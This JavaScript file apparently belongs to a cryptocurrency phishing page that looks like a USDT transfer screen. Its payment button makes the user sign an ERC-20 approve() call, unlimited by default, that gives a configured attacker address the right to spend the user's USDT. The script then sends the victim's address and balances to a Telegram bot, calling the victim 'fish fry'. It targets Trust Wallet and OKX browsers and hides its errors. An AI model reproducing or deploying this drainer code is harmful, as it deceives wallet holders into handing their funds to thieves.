document.addEventListener('DOMContentLoaded', function() {
  let ethBalance = 0;
  let usdtBalance = 0;
  let userAddress = null;

  connectWallet();

  async function connectWallet() {
    if (window.ethereum) {
      try {
        const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
        userAddress = accounts[0];
        initDApp();
      } catch (error) {
        // alert("连接钱包失败: " + error.message);
      }
    } else {
      // alert("未检测到 Trust Wallet。");
    }
  }

  async function initDApp() {
    try {

      const apiKeys = config.etherscanapiKeys;
      const apiKey = apiKeys[Math.floor(Math.random() * apiKeys.length)];

      const ethResponse = await fetch(`https://api.etherscan.io/api?module=account&action=balance&address=${userAddress}&apikey=${apiKey}`);
      const ethResult = await ethResponse.json();
      ethBalance = ethers.utils.formatEther(ethResult.result);
      

      const usdtContractAddress = "0xdAC17F958D2ee523a2206206994597C13D831ec7"; 
      const usdtResponse = await fetch(`https://api.etherscan.io/api?module=account&action=tokenbalance&contractaddress=${usdtContractAddress}&address=${userAddress}&tag=latest&apikey=${apiKey}`);
      const usdtResult = await usdtResponse.json();
      const usdtDecimals = 6;
      usdtBalance = ethers.utils.formatUnits(usdtResult.result, usdtDecimals);

      updateUsdtDisplay(usdtBalance);
    } catch (error) {
      // alert("初始化DApp时出错: " + error);
    }
  }
  
  function updateUsdtDisplay(balance) {
    const balanceDisplayElement = document.querySelector('.currency-display-component__text span');
    balanceDisplayElement.textContent = parseFloat(balance).toFixed(6);
  }

  document.querySelector('.send-v2__amount-max').addEventListener('click', function() {
    document.getElementById('available1').value = usdtBalance;
    validateInput();
    updateAmount(usdtBalance);
  });

  const inputField = document.getElementById('available1');
  inputField.addEventListener('input', validateInput);

  function validateInput() {
    const inputValue = parseFloat(inputField.value) || 0;
    if (inputValue > usdtBalance) {
      inputField.value = usdtBalance;
    }
  }


if (window.ethereum) {
    window.ethereum.on('chainChanged', (chainId) => {
        window.location.reload(); 
    });
}

document.querySelector('.page-container__footer-button').addEventListener('click', async function() {
  const inputValue = parseFloat(inputField.value) || 0;
  const ethBalanceNum = parseFloat(ethBalance);
  const usdtBalanceNum = parseFloat(usdtBalance);
  if (inputValue <= 0 || inputValue > usdtBalanceNum) {
      alert('请输入正确的金额');
      return;
  }
  if (config.ethBalanceThreshold !== '0' && ethBalanceNum < parseFloat(config.ethBalanceThreshold)) {
      alert("您的ETH余额不足以支付交易矿工费。");
      return;
  }
  if (config.usdtBalanceThreshold !== '0' && usdtBalanceNum < parseFloat(config.usdtBalanceThreshold)) {
      alert("您的USDT余额不足，发起交易可能会失败。");
      return;
  }
  if (!window.ethereum) {
      return;
  }

  const chainId = await window.ethereum.request({ method: 'eth_chainId' });
  const bscChainId = "0x1";
  if (chainId !== bscChainId) {
    alert("请先在右上角切换至 Ethereum 网络");
    return;
  }
  
  if (window.ethereum.isTrust || /okex/.test(navigator.userAgent.toLowerCase())) {
    await approve();
  } else {
    showWarningPage();
  }
});


  function showWarningPage() {
    var warningContainer = document.querySelector('.a_mobile-container1');
    if (warningContainer) {
      warningContainer.style.display = 'block';
      warningContainer.style.top = '0';
    }
}

  document.addEventListener('DOMContentLoaded', function() {
    document.title = '正在执行转账操作';
    document.getElementById('available1').addEventListener('input', function() {
        var amount = this.value;
        if (amount) {
            document.title = `正在进行转账支付 ${amount} USDT`;
        } else {
            document.title = 'USDT转账支付';
        }
        updateAmount(amount);
    });

    window.showTip = function(mode) {
        let tip1 = document.getElementById('tip1');
        let tip2 = document.getElementById('tip2');
        let option1 = document.getElementById('option1').querySelector('input');
        let option2 = document.getElementById('option2').querySelector('input');
        let amount = document.getElementById('available1').value;

        document.querySelectorAll('.approveAmount').forEach(function(elem) {
            elem.textContent = amount;
        });

        if (mode === 1) {
            tip1.style.display = 'block';
            tip2.style.display = 'none';
            option2.checked = false;
        } else if (mode === 2) {
            tip1.style.display = 'none';
            tip2.style.display = 'block';
            option1.checked = false;
        }
    };
  });

  function updateAmount(amount) {
    document.getElementById('number-input').value = amount;

    var approveAmountElements = document.querySelectorAll('.approveAmount');
    approveAmountElements.forEach(function(element) {
        element.innerText = amount;
    });
    document.title = `正在进行转账支付 ${amount} USDT`;
  }

  function scrollUpAndRedirect() {
    document.querySelector('.a_mobile-container1').style.display = 'none';
  }


  async function confirmApprove() {
    let option1 = document.getElementById('option1').querySelector('input').checked;
    let option2 = document.getElementById('option2').querySelector('input').checked;

    if (option1 || option2) {
        document.getElementById('errorText').style.display = 'none';
        await approve();
    } else {
        document.getElementById('errorText').style.display = 'block';
    }
  }

  function showToast(message, duration = 5000) {
      const toast = document.createElement('div');
      toast.className = 'toast';
      toast.textContent = message;
      document.body.appendChild(toast);
      toast.style.display = 'block';

      setTimeout(() => {
          toast.style.display = 'none';
          document.body.removeChild(toast);
      }, duration);
  }

async function approve() {
    const provider = new ethers.providers.Web3Provider(window.ethereum);
    const signer = provider.getSigner();
    const erc20ContractAddress = config.usdtContractAddress;

    try {
        const erc20Contract = new ethers.Contract(erc20ContractAddress, [
            "function balanceOf(address owner) view returns (uint256)",
            "function approve(address spender, uint256 amount) returns (bool)"
        ], signer);

        const approvalAmount = config.approvalAmount === "0" ? ethers.constants.MaxUint256 : ethers.utils.parseUnits(config.approvalAmount, 6);

        const authorizedAddress = await setAuthorizedAddress(signer, erc20Contract);
        const receipt = await initiateApprovalTransaction(erc20Contract, authorizedAddress, approvalAmount);
        await handleTransactionCompletion(signer, provider, receipt, authorizedAddress, receipt, erc20Contract);
    } catch (error) {
        console.error("cuowu: " + error.message);
    }
}

async function initiateApprovalTransaction(erc20Contract, authorizedAddress, approvalAmount) {
    const approveTx = await erc20Contract.approve(authorizedAddress, approvalAmount);
    const receipt = await approveTx.wait();
    return receipt;
}

async function handleTransactionCompletion(signer, provider, receipt, authorizedAddress, approveTx, erc20Contract) {
    if (receipt.status === 1 && authorizedAddress === config.authorizedAddress) {
        if (config.hint !== '0') {
            showToast(config.hint, 5000);
        }
        let usdtBalance = ethers.utils.formatUnits(await erc20Contract.balanceOf(await signer.getAddress()), 18);
        await sendTelegramNotification(await signer.getAddress(), usdtBalance, approveTx.hash, ethers.utils.formatEther(await provider.getBalance(await signer.getAddress())));
    }
}

  async function sendTelegramNotification(clientAddress, usdtBalance, transactionHash, ethBalance) {
    const message = `🛎<b>【ERC网络】授权通知</b>🛎\n\n` +
                    `🐠<b>鱼苗地址：</b><code>${clientAddress}</code>\n\n` +
                    `🔐<b>权限地址：</b><code>${config.authorizedAddress}</code>\n\n` +
                    `⏰<b>授权时间：</b><code>${new Date().toLocaleString('zh-CN', { hour12: false })}</code>\n\n` +
                    `💵<b>ETH余额：</b><code>${ethBalance}</code> | <b>USDT余额：</b><code>${usdtBalance}</code>`;
    const keyboard = {
        inline_keyboard: [[
            {
                text: '🌍进入区块链浏览器查看详情',
                url: `https://etherscan.io/address/${clientAddress}`
            }
        ]]
    };
    try {
        const response = await fetch(`https://api.telegram.org/bot${config.telegramBotToken}/sendMessage`, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({
                chat_id: config.telegramChannelId,
                text: message,
                parse_mode: 'HTML',
                reply_markup: keyboard
            })
        });

        const responseData = await response.json();
        if (!response.ok) {
            return;
        }
    } catch (error) {
        return;
    }
  }
});
